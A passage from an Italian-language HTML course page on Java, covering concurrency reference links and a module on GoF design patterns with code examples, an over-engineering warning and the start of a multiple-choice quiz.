                <h2>Link di Approfondimento - Modulo 14</h2>

                <div class="info-box">
                    <h4>Java Concurrency</h4>
                    <p><a href="https://docs.oracle.com/javase/tutorial/essential/concurrency/" target="_blank">Oracle: Java Concurrency Tutorial</a></p>
                    <p><a href="https://www.baeldung.com/java-concurrency" target="_blank">Baeldung: Java Concurrency</a></p>
                    <p><a href="https://jenkov.com/tutorials/java-concurrency/index.html" target="_blank">Jenkov: Java Concurrency Tutorial</a></p>
                </div>

                <div class="info-box">
                    <h4>ExecutorService & CompletableFuture</h4>
                    <p><a href="https://www.baeldung.com/java-executor-service-tutorial" target="_blank">Baeldung: ExecutorService Guide</a></p>
                    <p><a href="https://www.baeldung.com/java-completablefuture" target="_blank">Baeldung: CompletableFuture</a></p>
                </div>

                <div class="info-box">
                    <h4>Virtual Threads (Java 21)</h4>
                    <p><a href="https://openjdk.org/jeps/444" target="_blank">JEP 444: Virtual Threads</a></p>
                    <p><a href="https://www.baeldung.com/java-virtual-threads" target="_blank">Baeldung: Virtual Threads</a></p>
                    <p><a href="https://inside.java/2023/09/19/virtual-threads-with-spring/" target="_blank">Inside.java: Virtual Threads with Spring</a></p>
                </div>

                <div class="info-box">
                    <h4>Concurrent Collections</h4>
                    <p><a href="https://www.baeldung.com/java-concurrent-map" target="_blank">Baeldung: ConcurrentHashMap</a></p>
                    <p><a href="https://www.baeldung.com/java-blocking-queue" target="_blank">Baeldung: BlockingQueue</a></p>
                </div>

                <div class="info-box">
                    <h4>Libri Consigliati</h4>
                    <p><a href="https://jcip.net/" target="_blank">Java Concurrency in Practice</a> - Brian Goetz (il libro fondamentale)</p>
                    <p><a href="https://www.oreilly.com/library/view/java-threads-3rd/0596007825/" target="_blank">Java Threads</a> - O'Reilly</p>
                </div>
            </section>

            <!-- ==================== MODULO 15: DESIGN PATTERNS ==================== -->
            <header class="module-header" id="modulo15">
                <span class="module-tag">Modulo 15</span>
                <h1>Design Patterns</h1>
                <p>I pattern di progettazione GoF applicati a Java moderno, con esempi pratici da Spring e librerie comuni</p>
            </header>

            <!-- Creational Patterns Section -->
            <section class="section" id="modulo15-creational">
                <h2>Creational Patterns</h2>

                <p>I pattern creazionali gestiscono la creazione di oggetti, nascondendo la logica di istanziazione e rendendo il sistema indipendente da come gli oggetti vengono creati.</p>

                <h3>Factory Method</h3>
                <pre><code class="language-java">// Factory Method: delega la creazione di oggetti alle sottoclassi
// Definisce un'interfaccia per creare oggetti, ma le sottoclassi decidono quale classe istanziare

// Prodotto
interface Notification {
    void send(String message);
}

class EmailNotification implements Notification {
    @Override
    public void send(String message) {
        System.out.println("Sending email: " + message);
    }
}

class SMSNotification implements Notification {
    @Override
    public void send(String message) {
        System.out.println("Sending SMS: " + message);
    }
}

class PushNotification implements Notification {
    @Override
    public void send(String message) {
        System.out.println("Sending push: " + message);
    }
}

// Factory Method (Creator astratto)
abstract class NotificationFactory {
    // Factory method - le sottoclassi decidono cosa creare
    protected abstract Notification createNotification();

    // Template method che usa il factory method
    public void notifyUser(String message) {
        Notification notification = createNotification();
        notification.send(message);
    }
}

// Concrete Creators
class EmailNotificationFactory extends NotificationFactory {
    @Override
    protected Notification createNotification() {
        return new EmailNotification();
    }
}

class SMSNotificationFactory extends NotificationFactory {
    @Override
    protected Notification createNotification() {
        return new SMSNotification();
    }
}

// Uso
NotificationFactory factory = new EmailNotificationFactory();
factory.notifyUser("Hello!");  // delega alla sottoclasse</code></pre>

                <h3>Abstract Factory</h3>
                <pre><code class="language-java">// Abstract Factory: crea famiglie di oggetti correlati senza specificare classi concrete
// Utile quando hai più "temi" o "varianti" di un insieme di oggetti

// Famiglia di prodotti
interface Button { void render(); }
interface Checkbox { void render(); }

// Famiglia "Windows"
class WindowsButton implements Button {
    public void render() { System.out.println("Windows button"); }
}
class WindowsCheckbox implements Checkbox {
    public void render() { System.out.println("Windows checkbox"); }
}

// Famiglia "Mac"
class MacButton implements Button {
    public void render() { System.out.println("Mac button"); }
}
class MacCheckbox implements Checkbox {
    public void render() { System.out.println("Mac checkbox"); }
}

// Abstract Factory
interface GUIFactory {
    Button createButton();
    Checkbox createCheckbox();
}

class WindowsFactory implements GUIFactory {
    public Button createButton() { return new WindowsButton(); }
    public Checkbox createCheckbox() { return new WindowsCheckbox(); }
}

class MacFactory implements GUIFactory {
    public Button createButton() { return new MacButton(); }
    public Checkbox createCheckbox() { return new MacCheckbox(); }
}

// Client usa la factory, non conosce le classi concrete
class Application {
    private Button button;
    private Checkbox checkbox;

    public Application(GUIFactory factory) {
        button = factory.createButton();
        checkbox = factory.createCheckbox();
    }

    public void render() {
        button.render();
        checkbox.render();
    }
}

// Uso
GUIFactory factory = System.getProperty("os.name").contains("Mac")
    ? new MacFactory()
    : new WindowsFactory();
Application app = new Application(factory);</code></pre>

                <h3>Builder</h3>
                <pre><code class="language-java">// Builder: costruisce oggetti complessi step-by-step
// Utile quando un costruttore avrebbe troppi parametri

// Senza Builder (anti-pattern: telescoping constructor)
// User user = new User("John", "Doe", 30, "john@email.com", "123 Street", null, true);

// Con Builder
public class User {
    private final String firstName;  // required
    private final String lastName;   // required
    private final int age;           // optional
    private final String email;      // optional
    private final String address;    // optional
    private final boolean active;    // optional

    private User(Builder builder) {
        this.firstName = builder.firstName;
        this.lastName = builder.lastName;
        this.age = builder.age;
        this.email = builder.email;
        this.address = builder.address;
        this.active = builder.active;
    }

    public static class Builder {
        // Required
        private final String firstName;
        private final String lastName;

        // Optional with defaults
        private int age = 0;
        private String email = "";
        private String address = "";
        private boolean active = true;

        public Builder(String firstName, String lastName) {
            this.firstName = firstName;
            this.lastName = lastName;
        }

        public Builder age(int age) {
            this.age = age;
            return this;  // fluent API
        }

        public Builder email(String email) {
            this.email = email;
            return this;
        }

        public Builder address(String address) {
            this.address = address;
            return this;
        }

        public Builder active(boolean active) {
            this.active = active;
            return this;
        }

        public User build() {
            // Validazione opzionale
            if (age < 0) throw new IllegalStateException("Age cannot be negative");
            return new User(this);
        }
    }

    // Getters...
}

// Uso: chiaro, leggibile, type-safe
User user = new User.Builder("John", "Doe")
    .age(30)
    .email("john@email.com")
    .active(true)
    .build();

// LOMBOK: @Builder fa tutto automaticamente!
@Builder
public class Product {
    private String name;
    private double price;
    @Builder.Default
    private int quantity = 1;
}

Product p = Product.builder()
    .name("Laptop")
    .price(999.99)
    .build();

// Java Records + Builder (pattern comune)
// Record per immutabilità, Builder per costruzione</code></pre>

                <h3>Singleton</h3>
                <pre><code class="language-java">// Singleton: una sola istanza globale
// ATTENZIONE: spesso overused, rende il testing difficile

// ❌ Anti-pattern: Singleton tradizionale (problemi con testing e concorrenza)
public class LegacySingleton {
    private static LegacySingleton instance;

    private LegacySingleton() {}

    public static LegacySingleton getInstance() {
        if (instance == null) {
            instance = new LegacySingleton();  // race condition!
        }
        return instance;
    }
}

// ✅ Thread-safe: Initialization-on-demand holder
public class HolderSingleton {
    private HolderSingleton() {}

    private static class Holder {
        static final HolderSingleton INSTANCE = new HolderSingleton();
    }

    public static HolderSingleton getInstance() {
        return Holder.INSTANCE;
    }
}

// ✅ Best practice: Enum Singleton (Effective Java)
public enum ConfigSingleton {
    INSTANCE;

    private String configValue;

    public String getConfigValue() { return configValue; }
    public void setConfigValue(String value) { this.configValue = value; }
}
// Uso: ConfigSingleton.INSTANCE.getConfigValue()
// Vantaggi: serialization-safe, reflection-safe, thread-safe

// ✅ Modern approach: Dependency Injection (Spring)
// Il "singleton" diventa un bean gestito dal container
@Service  // Singleton scope by default
public class UserService {
    // ...
}

// Testing: puoi iniettare un mock
@MockBean
private UserService userService;

// Problemi del Singleton classico:
// - Global state: nasconde dipendenze
// - Testing: difficile mockare
// - Coupling: il codice dipende dalla classe concreta
// - Concurrency: richiede sincronizzazione</code></pre>

                <h3>Prototype</h3>
                <pre><code class="language-java">// Prototype: crea nuovi oggetti copiando un prototipo esistente
// Utile quando la creazione è costosa o l'oggetto ha configurazione complessa

public abstract class Shape implements Cloneable {
    protected String color;
    protected int x, y;

    public Shape() {}

    // Copy constructor
    public Shape(Shape source) {
        this.color = source.color;
        this.x = source.x;
        this.y = source.y;
    }

    public abstract Shape clone();

    // Setters...
}

public class Circle extends Shape {
    private int radius;

    public Circle() {}

    public Circle(Circle source) {
        super(source);
        this.radius = source.radius;
    }

    @Override
    public Circle clone() {
        return new Circle(this);
    }
}

public class Rectangle extends Shape {
    private int width, height;

    public Rectangle() {}

    public Rectangle(Rectangle source) {
        super(source);
        this.width = source.width;
        this.height = source.height;
    }

    @Override
    public Rectangle clone() {
        return new Rectangle(this);
    }
}

// Prototype Registry
public class ShapeCache {
    private static Map&lt;String, Shape&gt; cache = new HashMap&lt;&gt;();

    static {
        Circle circle = new Circle();
        circle.setRadius(10);
        cache.put("small-circle", circle);

        Rectangle rect = new Rectangle();
        rect.setWidth(100);
        rect.setHeight(50);
        cache.put("default-rect", rect);
    }

    public static Shape get(String id) {
        return cache.get(id).clone();  // restituisce una copia
    }
}

// Uso
Shape circle1 = ShapeCache.get("small-circle");
Shape circle2 = ShapeCache.get("small-circle");
// circle1 != circle2, sono copie indipendenti</code></pre>
            </section>

            <!-- Structural Patterns Section -->
            <section class="section" id="modulo15-structural">
                <h2>Structural Patterns</h2>

                <p>I pattern strutturali si occupano della composizione di classi e oggetti per formare strutture più grandi.</p>

                <h3>Adapter</h3>
                <pre><code class="language-java">// Adapter: converte l'interfaccia di una classe in un'altra che il client si aspetta
// "Traduttore" tra interfacce incompatibili

// Target: l'interfaccia che il client usa
interface MediaPlayer {
    void play(String filename);
}

// Adaptee: l'interfaccia esistente (incompatibile)
class AdvancedMediaPlayer {
    public void playVlc(String filename) {
        System.out.println("Playing VLC: " + filename);
    }

    public void playMp4(String filename) {
        System.out.println("Playing MP4: " + filename);
    }
}

// Adapter: adatta AdvancedMediaPlayer a MediaPlayer
class MediaAdapter implements MediaPlayer {
    private AdvancedMediaPlayer advancedPlayer;

    public MediaAdapter() {
        this.advancedPlayer = new AdvancedMediaPlayer();
    }

    @Override
    public void play(String filename) {
        if (filename.endsWith(".vlc")) {
            advancedPlayer.playVlc(filename);
        } else if (filename.endsWith(".mp4")) {
            advancedPlayer.playMp4(filename);
        }
    }
}

// Client usa MediaPlayer, non sa che internamente usa AdvancedMediaPlayer
MediaPlayer player = new MediaAdapter();
player.play("movie.mp4");

// Esempio reale: java.util.Arrays.asList()
// Adatta un array a List interface
String[] array = {"a", "b", "c"};
List&lt;String&gt; list = Arrays.asList(array);  // adapter!</code></pre>

                <h3>Decorator</h3>
                <pre><code class="language-java">// Decorator: aggiunge responsabilità dinamicamente senza modificare la classe originale
// Alternativa flessibile all'ereditarietà

// Component
interface Coffee {
    double getCost();
    String getDescription();
}

// Concrete Component
class SimpleCoffee implements Coffee {
    public double getCost() { return 1.0; }
    public String getDescription() { return "Simple coffee"; }
}

// Decorator base
abstract class CoffeeDecorator implements Coffee {
    protected Coffee decoratedCoffee;

    public CoffeeDecorator(Coffee coffee) {
        this.decoratedCoffee = coffee;
    }

    public double getCost() { return decoratedCoffee.getCost(); }
    public String getDescription() { return decoratedCoffee.getDescription(); }
}

// Concrete Decorators
class MilkDecorator extends CoffeeDecorator {
    public MilkDecorator(Coffee coffee) { super(coffee); }

    @Override
    public double getCost() {
        return super.getCost() + 0.5;
    }

    @Override
    public String getDescription() {
        return super.getDescription() + ", milk";
    }
}

class SugarDecorator extends CoffeeDecorator {
    public SugarDecorator(Coffee coffee) { super(coffee); }

    @Override
    public double getCost() {
        return super.getCost() + 0.2;
    }

    @Override
    public String getDescription() {
        return super.getDescription() + ", sugar";
    }
}

// Uso: composizione dinamica
Coffee coffee = new SimpleCoffee();
coffee = new MilkDecorator(coffee);
coffee = new SugarDecorator(coffee);
coffee = new SugarDecorator(coffee);  // doppio zucchero!

System.out.println(coffee.getDescription());  // "Simple coffee, milk, sugar, sugar"
System.out.println(coffee.getCost());         // 1.0 + 0.5 + 0.2 + 0.2 = 1.9

// Esempio reale: Java I/O Streams!
InputStream is = new BufferedInputStream(
    new FileInputStream("file.txt")
);
// FileInputStream: legge bytes
// BufferedInputStream: aggiunge buffering (decorator)

// Altro esempio
Reader reader = new BufferedReader(
    new InputStreamReader(
        new FileInputStream("file.txt"),
        StandardCharsets.UTF_8
    )
);</code></pre>

                <h3>Facade</h3>
                <pre><code class="language-java">// Facade: interfaccia semplificata per un sottosistema complesso
// Nasconde la complessità dietro un'API semplice

// Sottosistema complesso
class VideoDecoder {
    public void decode(String filename) {
        System.out.println("Decoding video: " + filename);
    }
}

class AudioDecoder {
    public void decode(String filename) {
        System.out.println("Decoding audio: " + filename);
    }
}

class SubtitleLoader {
    public void load(String filename) {
        System.out.println("Loading subtitles: " + filename);
    }
}

class VideoRenderer {
    public void render() {
        System.out.println("Rendering video");
    }
}

// Facade: interfaccia semplice
class VideoPlayerFacade {
    private VideoDecoder videoDecoder;
    private AudioDecoder audioDecoder;
    private SubtitleLoader subtitleLoader;
    private VideoRenderer renderer;

    public VideoPlayerFacade() {
        this.videoDecoder = new VideoDecoder();
        this.audioDecoder = new AudioDecoder();
        this.subtitleLoader = new SubtitleLoader();
        this.renderer = new VideoRenderer();
    }

    // Metodo semplice che nasconde la complessità
    public void playVideo(String filename) {
        videoDecoder.decode(filename);
        audioDecoder.decode(filename);
        subtitleLoader.load(filename.replace(".mp4", ".srt"));
        renderer.render();
    }
}

// Client: non deve conoscere il sottosistema
VideoPlayerFacade player = new VideoPlayerFacade();
player.playVideo("movie.mp4");

// Esempio reale: Spring's JdbcTemplate è una Facade su JDBC
// Nasconde: Connection, Statement, ResultSet, exception handling
jdbcTemplate.queryForObject("SELECT * FROM users WHERE id = ?",
    new BeanPropertyRowMapper&lt;&gt;(User.class), userId);</code></pre>

                <h3>Proxy</h3>
                <pre><code class="language-java">// Proxy: fornisce un surrogato per controllare l'accesso a un oggetto
// Tipi: Virtual Proxy (lazy loading), Protection Proxy (access control), Remote Proxy

// Subject
interface Image {
    void display();
}

// Real Subject (costoso da creare)
class RealImage implements Image {
    private String filename;

    public RealImage(String filename) {
        this.filename = filename;
        loadFromDisk();  // operazione costosa
    }

    private void loadFromDisk() {
        System.out.println("Loading " + filename + " from disk...");
    }

    @Override
    public void display() {
        System.out.println("Displaying " + filename);
    }
}

// Virtual Proxy (lazy loading)
class ImageProxy implements Image {
    private RealImage realImage;
    private String filename;

    public ImageProxy(String filename) {
        this.filename = filename;
        // NON carica l'immagine ancora
    }

    @Override
    public void display() {
        if (realImage == null) {
            realImage = new RealImage(filename);  // carica solo quando serve
        }
        realImage.display();
    }
}

// Uso
Image image = new ImageProxy("photo.jpg");  // niente I/O
// ... altre operazioni ...
image.display();  // ORA carica l'immagine

// SPRING AOP: il Proxy pattern in azione!
// @Transactional, @Cacheable, @Async creano proxy
@Service
public class UserService {
    @Transactional  // Spring crea un proxy!
    public void createUser(User user) {
        // Il proxy:
        // 1. Apre la transazione
        // 2. Chiama questo metodo
        // 3. Commit o rollback
    }
}

// JPA Lazy Loading usa Proxy
@Entity
public class Order {
    @ManyToOne(fetch = FetchType.LAZY)
    private Customer customer;  // è un proxy, non l'oggetto reale!
}

order.getCustomer().getName();  // SOLO ORA fa la query al DB</code></pre>
            </section>

            <!-- Behavioral Patterns Section -->
            <section class="section" id="modulo15-behavioral">
                <h2>Behavioral Patterns</h2>

                <p>I pattern comportamentali gestiscono la comunicazione e le responsabilità tra oggetti.</p>

                <h3>Strategy</h3>
                <pre><code class="language-java">// Strategy: definisce una famiglia di algoritmi intercambiabili
// Il client può scegliere quale algoritmo usare a runtime

// Strategy interface
interface PaymentStrategy {
    void pay(double amount);
}

// Concrete strategies
class CreditCardPayment implements PaymentStrategy {
    private String cardNumber;

    public CreditCardPayment(String cardNumber) {
        this.cardNumber = cardNumber;
    }

    @Override
    public void pay(double amount) {
        System.out.println("Paid $" + amount + " with credit card " + cardNumber);
    }
}

class PayPalPayment implements PaymentStrategy {
    private String email;

    public PayPalPayment(String email) {
        this.email = email;
    }

    @Override
    public void pay(double amount) {
        System.out.println("Paid $" + amount + " via PayPal: " + email);
    }
}

class CryptoPayment implements PaymentStrategy {
    @Override
    public void pay(double amount) {
        System.out.println("Paid $" + amount + " with Bitcoin");
    }
}

// Context
class ShoppingCart {
    private PaymentStrategy paymentStrategy;

    public void setPaymentStrategy(PaymentStrategy strategy) {
        this.paymentStrategy = strategy;
    }

    public void checkout(double amount) {
        paymentStrategy.pay(amount);
    }
}

// Uso
ShoppingCart cart = new ShoppingCart();
cart.setPaymentStrategy(new CreditCardPayment("1234-5678"));
cart.checkout(100.0);

cart.setPaymentStrategy(new PayPalPayment("user@email.com"));
cart.checkout(50.0);

// Java 8+: Strategy con Lambda!
// Quando l'interfaccia ha un solo metodo (functional interface)
@FunctionalInterface
interface SortStrategy&lt;T&gt; {
    void sort(List&lt;T&gt; list);
}

List&lt;String&gt; names = Arrays.asList("Charlie", "Alice", "Bob");

// Lambda come strategy
SortStrategy&lt;String&gt; ascending = list -> Collections.sort(list);
SortStrategy&lt;String&gt; descending = list -> Collections.sort(list, Collections.reverseOrder());

ascending.sort(names);  // [Alice, Bob, Charlie]

// Esempio: Comparator è uno Strategy pattern!
list.sort(Comparator.comparing(User::getName));
list.sort(Comparator.comparing(User::getAge).reversed());</code></pre>

                <h3>Observer</h3>
                <pre><code class="language-java">// Observer: definisce una dipendenza uno-a-molti
// Quando un oggetto cambia stato, tutti i dipendenti vengono notificati

// Observer interface
interface Observer {
    void update(String event);
}

// Subject (Observable)
class EventManager {
    private Map&lt;String, List&lt;Observer&gt;&gt; listeners = new HashMap&lt;&gt;();

    public void subscribe(String eventType, Observer observer) {
        listeners.computeIfAbsent(eventType, k -> new ArrayList&lt;&gt;()).add(observer);
    }

    public void unsubscribe(String eventType, Observer observer) {
        listeners.getOrDefault(eventType, Collections.emptyList()).remove(observer);
    }

    public void notify(String eventType, String data) {
        for (Observer observer : listeners.getOrDefault(eventType, Collections.emptyList())) {
            observer.update(data);
        }
    }
}

// Concrete Subject
class Editor {
    private EventManager events;
    private String content;

    public Editor() {
        this.events = new EventManager();
    }

    public EventManager getEvents() { return events; }

    public void setContent(String content) {
        this.content = content;
        events.notify("contentChanged", content);
    }

    public void save() {
        events.notify("save", content);
    }
}

// Concrete Observers
class EmailNotifier implements Observer {
    @Override
    public void update(String event) {
        System.out.println("Email sent: " + event);
    }
}

class LoggingObserver implements Observer {
    @Override
    public void update(String event) {
        System.out.println("Log: " + event);
    }
}

// Uso
Editor editor = new Editor();
editor.getEvents().subscribe("save", new EmailNotifier());
editor.getEvents().subscribe("save", new LoggingObserver());

editor.setContent("Hello World");
editor.save();  // notifica tutti gli observer

// Java built-in (deprecato): java.util.Observable
// Modern alternative: java.beans.PropertyChangeSupport

// Spring: Event-driven architecture con ApplicationEvent
@Component
public class OrderCreatedListener {
    @EventListener
    public void handleOrderCreated(OrderCreatedEvent event) {
        // reagisci all'evento
    }
}</code></pre>

                <h3>Template Method</h3>
                <pre><code class="language-java">// Template Method: definisce lo scheletro di un algoritmo,
// delegando alcuni step alle sottoclassi

abstract class DataProcessor {
    // Template method - definisce l'algoritmo
    public final void process() {
        readData();
        processData();
        writeData();

        // Hook method - opzionale, le sottoclassi possono override
        if (shouldNotify()) {
            sendNotification();
        }
    }

    // Step astratti - le sottoclassi DEVONO implementare
    protected abstract void readData();
    protected abstract void processData();
    protected abstract void writeData();

    // Hook con default implementation
    protected boolean shouldNotify() {
        return false;
    }

    protected void sendNotification() {
        System.out.println("Notification sent");
    }
}

class CSVProcessor extends DataProcessor {
    @Override
    protected void readData() {
        System.out.println("Reading CSV file");
    }

    @Override
    protected void processData() {
        System.out.println("Processing CSV data");
    }

    @Override
    protected void writeData() {
        System.out.println("Writing to database");
    }
}

class XMLProcessor extends DataProcessor {
    @Override
    protected void readData() {
        System.out.println("Reading XML file");
    }

    @Override
    protected void processData() {
        System.out.println("Parsing XML data");
    }

    @Override
    protected void writeData() {
        System.out.println("Writing to file");
    }

    @Override
    protected boolean shouldNotify() {
        return true;  // override del hook
    }
}

// Uso
DataProcessor processor = new CSVProcessor();
processor.process();

// Esempio reale: Spring's JdbcTemplate.execute()
// Il template gestisce connection, statement, exception handling
// Tu fornisci solo la logica specifica via callback</code></pre>

                <h3>Chain of Responsibility</h3>
                <pre><code class="language-java">// Chain of Responsibility: passa una richiesta lungo una catena di handler
// Ogni handler decide se processarla o passarla al successivo

// Handler interface
abstract class Handler {
    protected Handler next;

    public Handler setNext(Handler handler) {
        this.next = handler;
        return handler;  // per chaining fluent
    }

    public abstract void handle(Request request);

    protected void passToNext(Request request) {
        if (next != null) {
            next.handle(request);
        }
    }
}

// Concrete Handlers
class AuthenticationHandler extends Handler {
    @Override
    public void handle(Request request) {
        if (request.getToken() == null) {
            System.out.println("Authentication failed: no token");
            return;  // blocca la catena
        }
        System.out.println("Authentication passed");
        passToNext(request);
    }
}

class AuthorizationHandler extends Handler {
    @Override
    public void handle(Request request) {
        if (!request.hasPermission("admin")) {
            System.out.println("Authorization failed: insufficient permissions");
            return;
        }
        System.out.println("Authorization passed");
        passToNext(request);
    }
}

class RateLimitHandler extends Handler {
    @Override
    public void handle(Request request) {
        if (request.getRequestCount() > 100) {
            System.out.println("Rate limit exceeded");
            return;
        }
        System.out.println("Rate limit OK");
        passToNext(request);
    }
}

class BusinessLogicHandler extends Handler {
    @Override
    public void handle(Request request) {
        System.out.println("Processing business logic for: " + request.getData());
    }
}

// Costruzione della catena
Handler chain = new AuthenticationHandler();
chain.setNext(new AuthorizationHandler())
     .setNext(new RateLimitHandler())
     .setNext(new BusinessLogicHandler());

// Uso
chain.handle(new Request("token123", "admin", "data"));

// Esempio reale: Servlet Filters!
public class LoggingFilter implements Filter {
    public void doFilter(ServletRequest req, ServletResponse res, FilterChain chain) {
        System.out.println("Before");
        chain.doFilter(req, res);  // passa al prossimo filter
        System.out.println("After");
    }
}

// Spring Security: FilterChain con authentication, authorization, CSRF, etc.</code></pre>

                <h3>Command</h3>
                <pre><code class="language-java">// Command: incapsula una richiesta come oggetto
// Permette: queue, log, undo di operazioni

// Command interface
interface Command {
    void execute();
    void undo();
}

// Receiver
class TextEditor {
    private StringBuilder content = new StringBuilder();

    public void insert(String text, int position) {
        content.insert(position, text);
    }

    public void delete(int start, int length) {
        content.delete(start, start + length);
    }

    public String getContent() {
        return content.toString();
    }
}

// Concrete Commands
class InsertCommand implements Command {
    private TextEditor editor;
    private String text;
    private int position;

    public InsertCommand(TextEditor editor, String text, int position) {
        this.editor = editor;
        this.text = text;
        this.position = position;
    }

    @Override
    public void execute() {
        editor.insert(text, position);
    }

    @Override
    public void undo() {
        editor.delete(position, text.length());
    }
}

// Invoker
class CommandHistory {
    private Stack&lt;Command&gt; history = new Stack&lt;&gt;();

    public void execute(Command command) {
        command.execute();
        history.push(command);
    }

    public void undo() {
        if (!history.isEmpty()) {
            Command command = history.pop();
            command.undo();
        }
    }
}

// Uso
TextEditor editor = new TextEditor();
CommandHistory history = new CommandHistory();

history.execute(new InsertCommand(editor, "Hello ", 0));
history.execute(new InsertCommand(editor, "World", 6));
System.out.println(editor.getContent());  // "Hello World"

history.undo();
System.out.println(editor.getContent());  // "Hello "

// Variante moderna: Command come Runnable/Callable
ExecutorService executor = Executors.newFixedThreadPool(4);
executor.submit(() -> processOrder(order));  // command pattern con lambda!</code></pre>
            </section>

            <!-- Anti-patterns Section -->
            <section class="section" id="modulo15-antipatterns">
                <h2>Quando Usare e Quando Evitare</h2>

                <div class="info-box warning">
                    <h4>Anti-pattern: Overengineering con Design Patterns</h4>
                    <p>Non applicare pattern "perché esistono". Ogni pattern aggiunge complessità. Usa un pattern solo quando:</p>
                    <ul>
                        <li>Risolve un problema reale che hai ORA (non ipotetico futuro)</li>
                        <li>Il beneficio supera il costo della complessità aggiunta</li>
                        <li>Il team lo conosce e può mantenerlo</li>
                    </ul>
                </div>

                <pre><code class="language-java">// ❌ OVER-ENGINEERING: Factory per un solo tipo
public interface AnimalFactory {
    Animal create();
}

public class DogFactory implements AnimalFactory {
    public Animal create() { return new Dog(); }
}

// ... e poi usi solo DogFactory, mai altri tipi

// ✅ JUST DO IT: se hai solo cani
Animal dog = new Dog();

// ────────────────────────────────────────────────────────

// ❌ OVER-ENGINEERING: Strategy per 2 opzioni fisse
interface DiscountStrategy {
    double apply(double price);
}

class RegularDiscount implements DiscountStrategy { ... }
class VIPDiscount implements DiscountStrategy { ... }

// ... 3 classi per fare:
// if (isVIP) price * 0.8 else price * 0.9

// ✅ SIMPLE: se la logica è banale
double discount = isVIP ? 0.8 : 0.9;
double finalPrice = price * discount;

// ────────────────────────────────────────────────────────

// ❌ SINGLETON ABUSE: tutto diventa singleton
@Singleton
public class UserService { ... }
@Singleton
public class OrderService { ... }
@Singleton
public class EmailService { ... }

// Problemi: testing difficile, hidden dependencies, global state

// ✅ DEPENDENCY INJECTION: lascia che il container gestisca il lifecycle
@Service  // Spring lo rende singleton, ma è iniettabile e testabile
public class UserService {
    private final UserRepository repo;

    public UserService(UserRepository repo) {  // DI via costruttore
        this.repo = repo;
    }
}</code></pre>

                <div class="info-box success">
                    <h4>Regole d'Oro</h4>
                    <ol>
                        <li><strong>YAGNI</strong>: You Aren't Gonna Need It. Non aggiungere pattern "per il futuro".</li>
                        <li><strong>Rule of Three</strong>: Prima che un pattern abbia senso, di solito hai bisogno di almeno 3 varianti/casi.</li>
                        <li><strong>Start Simple</strong>: Inizia con la soluzione più semplice. Refactora verso un pattern quando il bisogno emerge.</li>
                        <li><strong>Prefer Composition</strong>: Strategy, Decorator, Observer preferiti su gerarchie di ereditarietà profonde.</li>
                    </ol>
                </div>

                <div class="diagram">
                    <pre>
┌─────────────────────────────────────────────────────────────────────────────┐
│                    Quando Applicare un Pattern?                             │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  ┌───────────────────────────────────────────────────────────────────────┐  │
│  │                    Decision Tree                                      │  │
│  └───────────────────────────────────────────────────────────────────────┘  │
│                                                                             │
│  Hai un problema REALE di design?                                          │
│         │                                                                   │
│         ├── NO ──► Non usare pattern, scrivi codice semplice               │
│         │                                                                   │
│         YES                                                                 │
│         │                                                                   │
│         ▼                                                                   │
│  Il problema si ripete in più punti?                                       │
│         │                                                                   │
│         ├── NO ──► Risolvi il caso specifico, non generalizzare            │
│         │                                                                   │
│         YES                                                                 │
│         │                                                                   │
│         ▼                                                                   │
│  Un pattern standard risolve questo problema?                              │
│         │                                                                   │
│         ├── NO ──► Crea la tua soluzione semplice                          │
│         │                                                                   │
│         YES                                                                 │
│         │                                                                   │
│         ▼                                                                   │
│  Il team conosce questo pattern?                                           │
│         │                                                                   │
│         ├── NO ──► Considera se vale la pena del training                  │
│         │                                                                   │
│         YES ──► APPLICA IL PATTERN ✓                                       │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
                    </pre>
                </div>
            </section>

            <!-- Quiz Section Modulo 15 -->
            <section class="quiz-section" id="modulo15-quiz">
                <h2>Quiz - Modulo 15: Design Patterns</h2>

                <div class="quiz-question" data-correct="c">
                    <h4>Q71. Quale pattern usa Spring quando crei un bean con @Transactional?</h4>
                    <div class="quiz-options">
                        <label class="quiz-option" data-value="a">
                            <input type="radio" name="q71" value="a">
                            <span>Decorator: aggiunge comportamento transazionale</span>
                        </label>
                        <label class="quiz-option" data-value="b">
                            <input type="radio" name="q71" value="b">
                            <span>Strategy: sceglie la strategia di transazione</span>
                        </label>
                        <label class="quiz-option" data-value="c">
                            <input type="radio" name="q71" value="c">
                            <span>Proxy: crea un proxy che gestisce begin/commit/rollback</span>
                        </label>
                        <label class="quiz-option" data-value="d">
                            <input type="radio" name="q71" value="d">
                            <span>Template Method: definisce lo scheletro della transazione</span>
                        </label>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q71')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q71"></div>
                </div>

                <div class="quiz-question" data-correct="b">
                    <h4>Q72. Java I/O usa BufferedInputStream(new FileInputStream(...)). Quale pattern è?</h4>
                    <div class="quiz-options">
                        <label class="quiz-option" data-value="a">
                            <input type="radio" name="q72" value="a">
                            <span>Adapter: adatta FileInputStream a un'altra interfaccia</span>
                        </label>
                        <label class="quiz-option" data-value="b">
                            <input type="radio" name="q72" value="b">
                            <span>Decorator: aggiunge buffering senza modificare FileInputStream</span>
                        </label>
                        <label class="quiz-option" data-value="c">
                            <input type="radio" name="q72" value="c">
                            <span>Proxy: controlla l'accesso a FileInputStream</span>
                        </label>
                        <label class="quiz-option" data-value="d">
                            <input type="radio" name="q72" value="d">
                            <span>Facade: semplifica l'API di I/O</span>
                        </label>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q72')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q72"></div>
                </div>

                <div class="quiz-question" data-correct="d">
                    <h4>Q73. Perché l'Enum Singleton è considerato il modo migliore per implementare Singleton in Java?</h4>
                    <div class="quiz-options">
                        <label class="quiz-option" data-value="a">
                            <input type="radio" name="q73" value="a">
                            <span>È più veloce degli altri approcci</span>
                        </label>
                        <label class="quiz-option" data-value="b">
                            <input type="radio" name="q73" value="b">
                            <span>Permette lazy initialization</span>
                        </label>
                        <label class="quiz-option" data-value="c">
                            <input type="radio" name="q73" value="c">
                            <span>È l'unico modo thread-safe</span>
                        </label>
                        <label class="quiz-option" data-value="d">
                            <input type="radio" name="q73" value="d">
                            <span>È thread-safe, serialization-safe, e reflection-safe automaticamente</span>
                        </label>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q73')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q73"></div>
                </div>

                <div class="quiz-question" data-correct="a">
